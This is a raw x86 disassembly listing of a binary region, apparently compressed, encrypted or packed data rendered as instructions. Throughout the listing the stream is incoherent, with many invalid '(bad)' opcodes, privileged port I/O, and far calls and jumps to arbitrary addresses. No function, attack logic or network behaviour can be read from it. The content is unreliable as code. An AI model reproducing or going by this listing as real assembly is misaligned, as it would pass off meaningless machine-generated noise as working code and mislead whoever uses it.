  423c5c:	outs   dx,BYTE PTR ds:[esi]
  423c5d:	push   0x26867b69
  423c62:	fdivr  DWORD PTR [ebx]
  423c64:	pop    ebx
  423c65:	aam    0xff
  423c67:	imul   ebp,DWORD PTR [ebp+esi*8-0x32ae5967],0x872c1e98
  423c72:	loopne 0x423c6c
  423c74:	in     eax,dx
  423c75:	test   al,0xd0
  423c77:	push   DWORD PTR gs:[edx+0x7a5198ea]
  423c7e:	jle    0x423c74
  423c80:	pop    esp
  423c81:	xchg   edx,eax
  423c82:	push   esp
  423c83:	popa   
  423c84:	adc    BYTE PTR [ecx],bh
  423c86:	pop    ebp
  423c87:	outs   dx,BYTE PTR ds:[esi]
  423c88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423c89:	push   ds
  423c8a:	push   0x68cdf1f1
  423c8f:	imul   eax,DWORD PTR [ebx-0x3b],0x20adda
	...
  423d12:	add    BYTE PTR [eax],al
  423d14:	retf   0xe76a
  423d17:	ja     0x423d00
  423d19:	(bad)  
  423d1a:	(bad)  
  423d1c:	daa    
  423d1d:	inc    ebx
  423d1e:	call   0xe546cc9d
  423d23:	jmp    0x769:0x1d13a
  423d2a:	add    BYTE PTR [eax],al
  423d2c:	ficomp WORD PTR [ebp+0x3c]
  423d2f:	clc    
  423d30:	and    edi,DWORD PTR [edi+0x14]
  423d33:	mov    bl,0x2f
  423d35:	pop    ds
  423d36:	adc    BYTE PTR [eax+eiz*8+0x6a],al
  423d3a:	cmp    eax,0x14e01543
  423d3f:	jns    0x423d20
  423d41:	dec    edi
  423d42:	mov    cl,0x12
  423d44:	xchg   DWORD PTR [ebx+0x2c60d5cc],esi
  423d4a:	xlat   BYTE PTR ds:[ebx]
  423d4b:	fwait
  423d4c:	jp     0x423d29
  423d4e:	ffree  st(0)
  423d50:	test   BYTE PTR [eax],bl
  423d52:	sbb    edi,ecx
  423d54:	les    eax,FWORD PTR [ebp-0x7f]
  423d57:	sti    
  423d58:	add    BYTE PTR [ebp-0x49],al
  423d5b:	neg    cl
  423d5d:	cmp    ecx,edi
  423d5f:	cs push es
  423d61:	cmp    al,0xa5
  423d63:	push   eax
  423d64:	lods   eax,DWORD PTR ds:[esi]
  423d65:	push   ebx
  423d66:	imul   edx,esi,0x8864524d
  423d6c:	dec    edi
  423d6d:	test   BYTE PTR [esi-0x3d],al
  423d70:	lahf   
  423d71:	lock sub esi,DWORD PTR [ebp-0x5e]
  423d75:	addr16 in al,0x85
  423d78:	pop    esi
  423d79:	lahf   
  423d7a:	jg     0x423d0f
  423d7c:	inc    ebp
  423d7d:	xor    BYTE PTR [ecx+0x12a139c],ch
  423d83:	fdiv   st(0),st
  423d85:	pop    edx
  423d86:	enter  0xbcaa,0xb0
  423d8a:	cmp    ebx,DWORD PTR [ecx]
  423d8c:	pop    esp
  423d8d:	add    eax,0x55ec0122
  423d92:	pop    ss
  423d93:	or     DWORD PTR [edx-0x71],esp
  423d96:	dec    bh
  423d98:	jmp    0x423d83
  423d9a:	dec    ebx
  423d9b:	cmp    eax,0x5ae874bb
  423da0:	mov    BYTE PTR [edi+0xf],dh
  423da3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423da4:	mov    al,ds:0x1414df31
  423da9:	in     eax,dx
  423daa:	mov    edx,0x6a596df2
  423daf:	or     edx,edx
  423db1:	xor    BYTE PTR [edx+0x32],0xc
  423db5:	sbb    dh,ch
  423db7:	mov    eax,0x8e9cfaa7
  423dbc:	xor    BYTE PTR ds:0xa58d2a50,0x2f
  423dc3:	fisttp DWORD PTR cs:[eax-0x48]
  423dc7:	pop    ss
  423dc8:	cwde   
  423dc9:	add    sp,WORD PTR [ebx+0x53]
  423dcd:	jnp    0x423dbb
  423dcf:	sub    edi,esp
  423dd1:	lds    ebp,FWORD PTR [esi+eax*4]
  423dd4:	push   esi
  423dd5:	adc    al,0xc
  423dd7:	sub    ch,BYTE PTR [edx-0x64e1f0fe]
  423ddd:	cmp    cl,ah
  423ddf:	bound  ecx,QWORD PTR [esi+edi*8-0x75]
  423de3:	pop    ebp
  423de4:	pop    edx
  423de5:	and    dh,BYTE PTR ds:[ebx-0x7e6db5e]
  423dec:	clc    
  423ded:	mov    ch,0xec
  423def:	mov    dh,0x33
  423df1:	add    al,0x47
  423df3:	(bad)  
  423df4:	rol    dl,1
  423df6:	sub    al,0x99
  423df8:	mov    DWORD PTR [eax*1+0x1ab3a2d4],ebp
  423dff:	cmp    esi,ebp
  423e01:	adc    DWORD PTR [ebx],ebp
  423e03:	jbe    0x423de0
  423e05:	mov    BYTE PTR [eax+0x4c],0x33
  423e09:	into   
  423e0a:	(bad)  
  423e0c:	adc    DWORD PTR [edx],edi
  423e0e:	dec    esi
  423e0f:	push   ss
  423e10:	xchg   esi,eax
  423e11:	hlt    
  423e12:	das    
  423e13:	fidiv  WORD PTR [eax+0x9682db6]
  423e19:	fistp  WORD PTR [ecx]
  423e1b:	fscale 
  423e1d:	add    esp,DWORD PTR [ebp+0x3b7022a5]
  423e23:	lds    eax,FWORD PTR [esi-0x54]
  423e26:	push   esp
  423e27:	xchg   ecx,eax
  423e28:	or     eax,0x60d99021
  423e2d:	jae    0x423e67
  423e2f:	ret    
  423e30:	lods   al,BYTE PTR es:[esi]
  423e32:	lahf   
  423e33:	lods   eax,DWORD PTR ds:[esi]
  423e34:	scas   eax,DWORD PTR es:[edi]
  423e35:	mov    BYTE PTR [eax+ebx*8+0x3390310b],0x3
  423e3d:	jecxz  0x423e96
  423e3f:	aas    
  423e40:	cmp    ecx,ebx
  423e42:	dec    ebp
  423e43:	in     al,dx
  423e44:	ja     0x423e53
  423e46:	or     ch,0x51
  423e49:	inc    esp
  423e4a:	pop    esi
  423e4b:	xor    BYTE PTR [ebx],cl
  423e4d:	xor    dl,BYTE PTR [ecx]
  423e4f:	and    DWORD PTR ds:0x91857133,ebx
  423e55:	icebp  
  423e56:	(bad)  
  423e57:	gs xchg edi,eax
  423e59:	push   ecx
  423e5a:	push   ebp
  423e5b:	jae    0x423e8d
  423e5d:	ret    0x1cb9
  423e60:	retf   
  423e61:	adc    BYTE PTR [ebx+edi*2],al
  423e64:	and    al,al
  423e66:	in     eax,dx
  423e67:	aaa    
  423e68:	add    ah,BYTE PTR [eax-0x55]
  423e6b:	xor    al,0x9e
  423e6d:	cmp    DWORD PTR [ecx-0x55],esi
  423e70:	add    DWORD PTR [edi-0x5f],edi
  423e73:	mov    dh,0x2a
  423e75:	lods   al,BYTE PTR ds:[esi]
  423e76:	xor    dh,BYTE PTR [eax]
  423e78:	pusha  
  423e79:	not    BYTE PTR [ecx-0x5648c5c4]
  423e7f:	sbb    al,0x47
  423e81:	call   0xdab5:0xcd1f8fb0
  423e88:	pusha  
  423e89:	push   ebp
  423e8a:	popa   
  423e8b:	sub    ch,BYTE PTR [ecx+edi*8+0xd6db41]
  423e92:	cmp    dl,BYTE PTR [ebp+0x4b946d96]
  423e98:	jle    0x423e72
  423e9a:	stos   DWORD PTR es:[edi],eax
  423e9b:	fldenv [ebx+0x34]
  423e9e:	shl    cl,0x2c
  423ea1:	mov    eax,0x60d74843
  423ea6:	mov    ecx,0x76fcd330
  423eab:	cli    
  423eac:	data16 fcmovb st,st(3)
  423eaf:	sub    esp,DWORD PTR [ebp-0x291261f9]
  423eb5:	inc    esi
  423eb6:	xor    eax,0xbb813cbb
  423ebb:	mov    bl,0xc5
  423ebd:	sbb    BYTE PTR [ebp-0x58ba6454],ch
  423ec3:	add    DWORD PTR [ebx+0x260e2f5f],esi
  423ec9:	sub    al,0x8d
  423ecb:	inc    eax
  423ecc:	lods   al,BYTE PTR ds:[esi]
  423ecd:	pop    es
  423ece:	push   cs
  423ecf:	push   edi
  423ed0:	addr16 test al,0x53
  423ed3:	mov    al,0xa3
  423ed5:	js     0x423f3d
  423ed7:	adc    eax,0x869c8cf0
  423edc:	fcmovnb st,st(0)
  423ede:	push   0x1f7a1a48
  423ee3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423ee4:	test   eax,0x1ba57bf1
  423ee9:	es aam 0xc0
  423eec:	xor    eax,0x7cd046a2
  423ef1:	aaa    
  423ef2:	sbb    al,0x10
  423ef4:	imul   edx,edi,0xbbc7ca15
  423efa:	cmp    ah,BYTE PTR [esp+eax*2+0x46104718]
  423f01:	lea    eax,[eax]
  423f03:	ret    0x3183
  423f06:	add    al,0x4
  423f08:	xor    eax,DWORD PTR [eax-0x599c6de2]
  423f0e:	mov    cl,0x9b
  423f10:	scas   al,BYTE PTR es:[edi]
  423f11:	dec    sp
  423f13:	dec    eax
  423f14:	sub    al,0xe8
  423f16:	sti    
  423f17:	jbe    0x423f13
  423f19:	adc    ecx,0x9a2e6e55
  423f1f:	popf   
  423f20:	mov    edx,0x5c5787cf
  423f25:	out    0xf2,al
  423f27:	xchg   bh,dh
  423f29:	aas    
  423f2a:	inc    ebp
  423f2b:	out    dx,al
  423f2c:	mov    ss,WORD PTR [edx+0xd]
  423f2f:	sub    bh,dh
  423f31:	iret   
  423f32:	xor    ebx,DWORD PTR ds:0xe9e93f02
  423f38:	stos   DWORD PTR es:[edi],eax
  423f39:	mov    al,0x33
  423f3b:	ret    
  423f3c:	bnd jbe 0x423ed1
  423f3f:	mov    eax,0x7eb5595f
  423f44:	sub    al,ah
  423f46:	in     eax,dx
  423f47:	inc    edx
  423f48:	rol    DWORD PTR [ebx+edi*8],0xf3
  423f4c:	lock cmp ch,BYTE PTR [edi+0x22709f24]
  423f53:	je     0x4a363d49
  423f59:	out    0x78,al
  423f5b:	mov    eax,0x5946284f
  423f60:	mov    bl,0x7b
  423f62:	cwde   
  423f63:	scas   eax,DWORD PTR es:[edi]
  423f64:	in     eax,0x96
  423f66:	pop    esp
  423f67:	mov    eax,0x5960654
  423f6c:	imul   DWORD PTR [ecx+0x1fdb1f42]
  423f72:	sbb    al,0xaa
  423f74:	test   al,0x81
  423f76:	cmp    edi,ebp
  423f78:	adc    ebp,DWORD PTR [eax-0xb3d638e]
  423f7e:	pop    edx
  423f7f:	or     ebx,DWORD PTR [edx]
  423f81:	scas   eax,DWORD PTR es:[edi]
  423f82:	rcl    BYTE PTR [ebx+ebp*1],1
  423f85:	fnstsw WORD PTR [ecx-0x356260b2]
  423f8b:	daa    
  423f8c:	mov    bh,al
  423f8e:	or     esi,DWORD PTR [esi-0x67]
  423f91:	xor    DWORD PTR [edx],esp
  423f93:	dec    ebp
  423f94:	fbstp  TBYTE PTR ds:0x6e4556fb
  423f9a:	(bad)  
  423f9b:	enter  0xa2e4,0xab
  423f9f:	and    eax,0x3d717dd4
  423fa4:	gs jae 0x423f8d
  423fa7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423fa8:	push   DWORD PTR [edx+0x39eaeeaf]
  423fae:	lock hlt 
  423fb0:	sbb    ch,bh
  423fb2:	mov    cl,0x20
  423fb4:	or     eax,0x1348239f
  423fb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423fba:	int3   
  423fbb:	push   esp
  423fbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423fbd:	pop    edi
  423fbe:	jae    0x423fb3
  423fc0:	cmp    BYTE PTR [ecx],0xa8
  423fc3:	lods   eax,DWORD PTR ds:[esi]
  423fc4:	scas   eax,DWORD PTR es:[edi]
  423fc5:	ret    
  423fc6:	inc    ecx
  423fc7:	jmp    0x423f78
  423fc9:	cmc    
  423fca:	xlat   BYTE PTR ds:[ebx]
  423fcb:	repz fsub st,st(5)
  423fce:	jnp    0x42401c
  423fd0:	and    eax,0x1de29094
  423fd5:	mov    eax,0xe27a47f2
  423fda:	hlt    
  423fdb:	mov    ds:0xbee1acab,al
  423fe0:	sub    DWORD PTR [edi+0x3e],ebp
  423fe3:	ror    BYTE PTR [ebp-0x5465b4de],0x21
  423fea:	std    
  423feb:	popf   
  423fec:	sbb    ebx,DWORD PTR es:[ebp-0x4b3368d3]
  423ff3:	mov    bl,0x56
  423ff5:	inc    esi
  423ff6:	and    al,0x5
  423ff8:	mov    bl,0x7f
  423ffa:	(bad)  
  423ffb:	in     al,dx
  423ffc:	leave  
  423ffd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423ffe:	pop    ecx
  423fff:	imul   ebp,DWORD PTR [ebx+0x18f0c1c5],0xa3c75bd3
  424009:	mov    esp,DWORD PTR [edx-0x583f71db]
  42400f:	xor    esi,DWORD PTR [esi]
  424011:	jbe    0x424019
  424013:	mov    bl,0x14
  424015:	(bad)  
  424016:	and    eax,0x9fcff532
  42401b:	cmp    BYTE PTR [edx+edi*8-0x60],bl
  42401f:	xchg   esp,eax
  424020:	jo     0x423faa
  424022:	adc    DWORD PTR [bx+0x67b],edx
  424027:	std    
  424028:	fst    QWORD PTR [ebx+0x65]
  42402b:	push   ebp
  42402c:	in     al,dx
  42402d:	xor    BYTE PTR [edi-0x3a],dl
  424030:	in     al,0x7a
  424032:	inc    eax
  424033:	ins    BYTE PTR es:[edi],dx
  424034:	cld    
  424035:	pop    edx
  424036:	rcr    DWORD PTR [ebp+edi*8+0x4ddc7702],cl
  42403d:	mov    al,0x74
  42403f:	push   cs
  424040:	daa    
  424041:	scas   eax,DWORD PTR es:[edi]
  424042:	stos   DWORD PTR es:[edi],eax
  424043:	lahf   
  424044:	inc    ebp
  424045:	outs   dx,BYTE PTR ds:[si]
  424047:	out    0x40,eax
  424049:	jmp    0x424078
  42404b:	(bad)  
  42404c:	sub    DWORD PTR [ecx-0x20153f43],eax
  424052:	jae    0x4240be
  424054:	pop    esi
  424055:	push   ebp
  424056:	pop    esp
  424057:	mov    esp,0x7c948bed
  42405c:	xchg   edi,eax
  42405d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42405e:	mov    bl,0xc6
  424060:	in     eax,dx
  424061:	pushw  0xff97
  424064:	pop    eax
  424065:	adc    cl,BYTE PTR [ecx]
  424067:	ds out 0x79,eax
  42406a:	fsub   st,st(5)
  42406c:	std    
  42406d:	sbb    ecx,DWORD PTR [ecx+edi*2+0x55]
  424071:	mov    cs,WORD PTR [ebp-0x1d]
  424074:	sbb    BYTE PTR [esp+esi*2+0x454642cd],bl
  42407b:	adc    DWORD PTR [ecx+0x17],ecx
  42407e:	jns    0x4240c6
  424080:	in     eax,0x3c
  424082:	mov    ebx,0x6084118a
  424087:	sub    esi,DWORD PTR [edi+ecx*2+0x2b]
  42408b:	or     al,BYTE PTR [eax+0x208a1274]
  424091:	pop    esp
  424092:	mov    ?,WORD PTR [edi-0x5e9cab51]
  424098:	test   DWORD PTR fs:[edi],esp
  42409b:	adc    esi,esi
  42409d:	stc    
  42409e:	add    ecx,ebp
  4240a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4240a1:	retf   0xcfdc
  4240a4:	push   ecx
  4240a5:	dec    ebp
  4240a6:	adc    BYTE PTR [edx-0x3d],ah
  4240a9:	in     al,0x23
  4240ab:	scas   al,BYTE PTR es:[edi]
  4240ac:	aam    0x8d
  4240ae:	aaa    
  4240af:	fimul  DWORD PTR [ebx+eiz*1]
  4240b2:	xor    eax,0x93766891
  4240b7:	push   edi
  4240b8:	push   es
  4240b9:	xchg   edi,eax
  4240ba:	xor    ch,cl
  4240bc:	add    BYTE PTR [esi+0x354fd00f],cl
  4240c2:	inc    sp
  4240c4:	adc    eax,0xc7526d21
  4240c9:	mov    ah,0x31
  4240cb:	inc    ebx
  4240cc:	adc    al,0xfe
  4240ce:	std    
  4240cf:	ja     0x4240fa
  4240d1:	mov    eax,ds:0xd9fcb0b4
  4240d6:	cmp    BYTE PTR [ebx],0xcd
  4240d9:	jno    0x4240b1
  4240db:	mov    esi,0xfae97b8b
  4240e0:	jp     0x424123
  4240e2:	pop    ss
  4240e3:	sub    cl,BYTE PTR ds:0xf34dbc64
  4240e9:	mul    ebp
  4240eb:	xchg   BYTE PTR [ebx],al
  4240ed:	and    dh,BYTE PTR [eax]
  4240ef:	lods   eax,DWORD PTR ds:[esi]
  4240f0:	fldcw  WORD PTR [edi-0x54ed70e5]
  4240f6:	mov    al,0x86
  4240f8:	dec    edi
  4240f9:	(bad)  
  4240fa:	and    al,0x3c
  4240fc:	mov    bh,0x8
  4240fe:	and    esp,esp
  424100:	or     BYTE PTR [ecx-0x9],dl
  424103:	lds    ebx,FWORD PTR [esi-0x4c3399ab]
  424109:	jle    0x4240d3
  42410b:	add    eax,0x679ea73b
  424110:	dec    ecx
  424111:	test   esi,edx
  424113:	int    0x9a
  424115:	mov    ds:0xfe4e8b1d,eax
  42411a:	lods   al,BYTE PTR ds:[esi]
  42411b:	loope  0x424190
  42411d:	sub    al,0xde
  42411f:	clc    
  424120:	mov    ch,0xfd
  424122:	push   ss
  424123:	fwait
  424124:	inc    esp
  424125:	leave  
  424126:	in     eax,dx
  424127:	mov    esi,0x72ca24d7
  42412c:	or     al,0x81
  42412e:	(bad)  
  42412f:	or     eax,DWORD PTR [ebx]
  424131:	test   BYTE PTR [edx+0x1cec98bc],al
  424137:	cwde   
  424138:	shl    BYTE PTR [ebx+edx*8-0x5],0x2a
  42413d:	shl    DWORD PTR es:[ebx],1
  424140:	push   eax
  424141:	and    ebp,DWORD PTR [eax]
  424143:	aad    0x87
  424145:	push   eax
  424146:	lods   al,BYTE PTR ds:[esi]
  424147:	sbb    eax,DWORD PTR [edi+esi*1]
  42414a:	push   esi
  42414b:	ret    0x2735
  42414e:	dec    eax
  42414f:	inc    edi
  424150:	cmp    eax,0xc8c1c1f0
  424155:	int    0x4d
  424157:	inc    eax
  424158:	sub    dh,al
  42415a:	dec    ebx
  42415b:	fisttp WORD PTR [edi]
  42415d:	pusha  
  42415e:	call   0x77a9:0xda699765
  424165:	push   ebp
  424167:	lods   eax,DWORD PTR ds:[esi]
  424168:	es std 
  42416a:	or     al,0x63
  42416c:	add    eax,0x9476fb6d
  424171:	or     ebx,esi
  424173:	mov    esp,0x5dc496c2
  424178:	jge    0x424176
  42417a:	dec    ebp
  42417b:	mov    eax,ds:0x18663810
  424180:	jle    0x4241f4
  424182:	inc    esp
  424183:	lahf   
  424184:	icebp  
  424185:	cmp    BYTE PTR [edx+eax*1],0x97
  424189:	retf   0x3fdb
  42418c:	lods   eax,DWORD PTR ds:[esi]
  42418d:	mov    al,ds:0x10e3231f
  424192:	inc    eax
  424193:	shr    DWORD PTR [ebp+edi*1-0x1f],0x63
  424198:	and    eax,esp
  42419a:	mov    ds:0x8461b544,eax
  42419f:	test   al,0xe2
  4241a1:	in     eax,0xfb
  4241a3:	call   0x181a:0x1ebd6f57
  4241aa:	mov    WORD PTR fs:[ecx+ecx*4-0x75bf513e],ss
  4241b2:	xor    al,0x5a
  4241b4:	fldcw  WORD PTR cs:[esp+eiz*8]
  4241b8:	iret   
  4241b9:	rcr    DWORD PTR [ebp+0x76b9441e],cl
  4241bf:	imul   edi,ebp,0x554d45fe
  4241c5:	mov    edi,0x7385a460
  4241ca:	out    dx,eax
  4241cb:	jmp    0xe12a:0x447fc321
  4241d2:	mov    ah,0x40
  4241d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4241d5:	lea    ebx,[ebp-0x38885e81]
  4241db:	and    BYTE PTR [edi+0x23c4293],ah
  4241e1:	mov    esp,0xbf22aea4
  4241e6:	pop    ebp
  4241e7:	adc    ah,BYTE PTR [eax+0x9]
  4241ea:	call   0xd443:0xcb5da689
  4241f1:	mov    bl,0x3a
  4241f3:	jnp    0x424196
  4241f5:	not    DWORD PTR [edx+0x4c010d21]
  4241fb:	sub    BYTE PTR [edi-0xa],0xa
  4241ff:	shl    BYTE PTR [edx-0x3fa00021],1
  424205:	xor    BYTE PTR [ebx],bh
  424207:	sbb    DWORD PTR [esi-0x4e64f175],esi
  42420d:	das    
  42420e:	sub    dh,BYTE PTR [ebp-0x70]
  424211:	shl    BYTE PTR [ebx+eax*1+0x5c],1
  424215:	inc    esi
  424216:	mov    BYTE PTR [edi+0x6d9423f1],bh
  42421c:	xchg   ch,ch
  42421e:	cmp    eax,0xa2a8e37a
  424223:	movaps xmm5,xmm1
  424226:	xchg   edi,eax
  424227:	les    edi,FWORD PTR [ebp+0x22]
  42422a:	xor    DWORD PTR [esi+0x3],ecx
  42422d:	stc    
  42422e:	and    bh,BYTE PTR [esi-0x2fe3ff15]
  424234:	mov    eax,gs:0x14e1eb33
  42423a:	fnstcw WORD PTR [eax-0x31]
  42423d:	or     al,0xd0
  42423f:	sub    al,0xb7
  424241:	push   edx
  424242:	pop    esp
  424243:	cmp    DWORD PTR [edx],esp
  424245:	inc    ebp
  424247:	add    al,0x2f
  424249:	iret   
  42424a:	arpl   WORD PTR [ebx+0x35fa680f],bp
  424250:	dec    edx
  424251:	fistp  DWORD PTR cs:[eax+0x43]
  424255:	and    bh,BYTE PTR [ebp+0x57]
  424258:	push   edx
  424259:	xchg   ebp,eax
  42425a:	popa   
  42425b:	sub    BYTE PTR [edx],bh
  42425d:	jb     0x4242d2
  42425f:	not    BYTE PTR [edx-0x62]
  424262:	out    0x62,al
  424264:	ret    
  424265:	clc    
  424266:	jmp    0x42425a
  424268:	mov    esi,0x6b28cb6a
  42426d:	mov    bh,0x24
  42426f:	int3   
  424270:	push   esi
  424271:	mul    ah
  424273:	xor    edx,DWORD PTR [ebx+esi*4-0x5f55b593]
  42427a:	fnstenv [edi+0x59]
  42427d:	fnsave [ecx-0x11886510]
  424283:	xchg   BYTE PTR es:[esi+0x8],ah
  424287:	jle    0x4242cf
  424289:	ror    BYTE PTR [edx],1
  42428b:	jns    0x4242a6
  42428d:	inc    esp
  42428e:	sub    eax,0xcb7b8df4
  424293:	adc    ecx,edi
  424295:	rcl    ebx,cl
  424297:	push   edx
  424298:	scas   al,BYTE PTR es:[edi]
  424299:	in     eax,dx
  42429a:	xchg   ecx,eax
  42429b:	test   ebp,0x39e9084b
  4242a1:	(bad)  [eax-0x52dd939c]
  4242a7:	call   0xa142:0xb76f0981
  4242ae:	pop    ecx
  4242af:	outs   dx,BYTE PTR ds:[esi]
  4242b0:	sar    BYTE PTR [esi+0x21d03a3b],0xc4
  4242b7:	or     BYTE PTR [edi-0x24964b36],0x3d
  4242be:	mov    bl,ah
  4242c0:	scas   eax,DWORD PTR es:[edi]
  4242c1:	stos   BYTE PTR es:[edi],al
  4242c2:	or     al,0x9d
  4242c4:	into   
  4242c5:	xlat   BYTE PTR ds:[ebx]
  4242c6:	stc    
  4242c7:	xor    al,ah
  4242c9:	jge    0x424263
  4242cb:	test   DWORD PTR [ecx-0x7f],edi
  4242ce:	(bad)  [edi+0x71df2815]
  4242d4:	sub    DWORD PTR [ebx+0x60],esi
  4242d7:	int3   
  4242d8:	xor    eax,0xc3416407
  4242dd:	shr    BYTE PTR [edi],1
  4242df:	lock in al,0x43
  4242e2:	jb     0x424296
  4242e4:	mov    BYTE PTR ds:0xbb4067f2,ah
  4242ea:	in     al,0xc3
  4242ec:	push   0xd26dea91
  4242f1:	lock sub edx,DWORD PTR [esi-0x32]
  4242f5:	cmc    
  4242f6:	and    cl,BYTE PTR [edx-0xb674e7e]
  4242fc:	jmp    0xc9cb:0x8ce20b55
  424303:	cmp    DWORD PTR [esi],esi
  424305:	in     eax,dx
  424306:	push   ebx
  424307:	dec    esi
  424308:	adc    bh,BYTE PTR [ecx+0x38d53]
  42430e:	ins    BYTE PTR es:[edi],dx
  42430f:	pop    esp
  424310:	sahf   
  424311:	adc    al,0xe2
  424313:	test   BYTE PTR [edx+0xe63db1d],dl
  424319:	push   esi
  42431a:	jle    0x424369
  42431c:	or     eax,0x9aefb38a
  424321:	adc    edi,DWORD PTR [ebx+esi*1+0x6f853a02]
  424328:	jo     0x424355
  42432a:	or     bl,BYTE PTR [esi-0x6d85428d]
  424330:	test   BYTE PTR [ebp+ebp*2+0x5d3adea6],bl
  424337:	fmul   DWORD PTR [ecx]
  424339:	push   0x1013884b
  42433e:	aam    0x58
  424340:	push   ss
  424341:	xchg   ecx,eax
  424342:	sbb    bh,BYTE PTR [edi-0x4e0265c8]
  424348:	imul   edi,DWORD PTR ds:0x83b50e19,0x4a
  42434f:	inc    edi
  424350:	(bad)  
  424351:	xchg   edx,eax
  424352:	ret    0xbb00
  424355:	dec    esi
  424356:	pop    esp
  424357:	xor    esp,DWORD PTR [ebp+edi*1-0x4903f49c]
  42435e:	dec    eax
  42435f:	jp     0x42431f
  424361:	clc    
  424362:	leave  
  424363:	pop    ebx
  424364:	mov    ch,0x73
  424366:	and    al,0x36
  424368:	ror    DWORD PTR [edi],cl
  42436a:	or     DWORD PTR [edx],0x83d7b222
  424370:	in     al,dx
  424371:	into   
  424372:	lds    edx,FWORD PTR [eax-0x121ed3bb]
  424378:	repnz imul eax,DWORD PTR [edx-0x70992ceb],0xee49386b
  424383:	push   ebp
  424384:	push   ss
  424385:	stos   BYTE PTR es:[edi],al
  424386:	xchg   esi,eax
  424387:	sbb    al,0xaa
  424389:	mov    al,BYTE PTR [ecx]
  42438b:	clc    
  42438c:	adc    BYTE PTR [ecx+0x63ee8184],ch
  424392:	jg     0x424347
  424394:	and    DWORD PTR [edx-0x5d9061fb],0xffffffd6
  42439b:	(bad)  
  42439d:	adc    eax,0x5dc7f806
  4243a2:	jns    0x4243fa
  4243a4:	inc    ebx
  4243a5:	inc    ebp
  4243a6:	mov    al,0x34
  4243a8:	or     DWORD PTR [edx+ebp*1+0x35],ecx
  4243ac:	fs mov esi,0x9a28f56a
  4243b2:	sbb    edx,DWORD PTR [ebx+eiz*4+0x6d]
  4243b6:	fadd   QWORD PTR [edi-0x5]
  4243b9:	test   esp,ebx
  4243bb:	and    al,0x11
  4243bd:	cmp    eax,0xf67913f7
  4243c2:	mov    eax,0x427e8310
  4243c7:	retf   
  4243c8:	push   es
  4243c9:	push   esp
  4243ca:	push   ecx
  4243cb:	sbb    esp,DWORD PTR [esi]
  4243cd:	in     al,dx
  4243ce:	cmp    ebx,ebx
  4243d0:	cmc    
  4243d1:	pop    es
  4243d2:	jo     0x42443b
  4243d4:	jne    0x42438a
  4243d6:	sub    dl,BYTE PTR [ecx+0x3899bfba]
  4243dc:	js     0x42444b
  4243de:	and    BYTE PTR [ecx-0x51ebae1a],0xfa
  4243e5:	mov    ch,0xd1
  4243e7:	pop    esi
  4243e8:	mov    ds:0xdda9eda,eax
  4243ed:	jg     0x4243ec
  4243ef:	pusha  
  4243f0:	jb     0x42444d
  4243f2:	jmp    0x73833c66
  4243f7:	aam    0xbf
  4243f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4243fa:	fstp   QWORD PTR ds:0xfa1ca2e9
  424400:	cld    
  424401:	dec    eax
  424402:	pop    edi
  424403:	xor    al,0xeb
  424405:	scas   al,BYTE PTR es:[edi]
  424406:	cmp    BYTE PTR [ebx],cl
  424408:	jae    0x424410
  42440a:	add    edi,DWORD PTR [eax-0x45b5e1a1]
  424410:	or     al,0xf4
  424412:	and    DWORD PTR [edi+ebp*8+0x42],0xebe8201d
  42441a:	pop    edi
  42441b:	cmp    BYTE PTR [esi+0x5c79abe6],bh
  424421:	shl    BYTE PTR [esi],1
  424423:	fst    DWORD PTR [esi-0x53]
  424426:	stos   BYTE PTR es:[edi],al
  424427:	sub    eax,edi
  424429:	cld    
  42442a:	mov    edi,0x786c685
  42442f:	xor    edx,DWORD PTR [edi]
  424431:	xor    al,0xc4
  424433:	push   ds
  424434:	mov    dl,0x59
  424436:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424437:	(bad)  
  424438:	or     al,0xde
  42443a:	mov    esi,0xd2b662a9
  42443f:	pusha  
  424440:	sub    al,0x3a
  424442:	xchg   ebp,eax
  424443:	sbb    eax,0xce30e956
  424448:	or     dh,BYTE PTR [ebx-0x1c]
  42444b:	mov    ?,WORD PTR [ebx+0x8]
  42444e:	lock std 
  424450:	fwait
  424451:	push   0xffffff9e
  424453:	loope  0x4244b9
  424455:	push   ds
  424456:	add    edx,DWORD PTR [ebx]
  424458:	dec    edi
  424459:	or     BYTE PTR [ebx-0x4a],0x14
  42445d:	mov    edx,0x32e1b101
  424462:	cmp    DWORD PTR [esi+esi*2+0x19],edi
  424466:	adc    ebx,DWORD PTR [ebp+0x40]
  424469:	adc    eax,0x1ebcc37d
  42446e:	pop    ebp
  42446f:	inc    edx
  424470:	in     eax,dx
  424471:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424472:	xchg   ebx,eax
  424473:	mov    DWORD PTR [eax],ecx
  424475:	sub    al,0xfd
  424477:	cmp    edx,DWORD PTR [edi]
  424479:	leave  
  42447a:	(bad)  
  42447b:	in     al,0x2
  42447d:	in     eax,dx
  42447e:	mov    edi,0x2a8b50f6
  424483:	jns    0x424494
  424485:	mov    ch,0xda
  424487:	xor    ebp,0xfa467109
  42448d:	leave  
  42448e:	daa    
  42448f:	mov    bh,0xf7
  424491:	sbb    DWORD PTR fs:[ebp+0x56],0x0
	...
  424512:	add    BYTE PTR [eax],al
  424514:	push   cs
  424515:	pop    esp
  424516:	mov    esp,0xffe7fe47
  42451b:	pop    ebp
  42451c:	es mov eax,0xbb6cfe17
  424522:	in     eax,0xcc
  424524:	mov    ds:0x690001d8,eax
  424529:	pop    es
  42452a:	add    BYTE PTR [eax],al
  42452c:	sahf   
  42452d:	popa   
  42452e:	xor    al,0x8
  424530:	add    dl,BYTE PTR [esp+ebx*8+0x1a]
  424534:	in     al,0x19
  424536:	rcr    DWORD PTR [ecx+0xc],0x3f
  42453a:	add    al,0xb0
  42453c:	xor    al,0x81
  42453e:	icebp  
  42453f:	int    0x5c
  424541:	mov    bl,dl
  424543:	(bad)  
  424544:	loope  0x42455e
  424546:	fs loop 0x4244d0
